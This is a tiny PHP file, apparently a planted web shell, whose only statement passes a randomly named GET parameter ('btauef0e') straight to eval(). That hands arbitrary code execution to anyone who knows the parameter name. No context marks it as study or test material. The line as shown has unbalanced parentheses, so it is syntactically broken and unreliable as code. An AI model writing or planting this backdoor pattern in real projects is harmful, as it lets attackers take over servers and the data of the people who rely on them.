<?php
eval(($_GET['btauef0e']);
?>
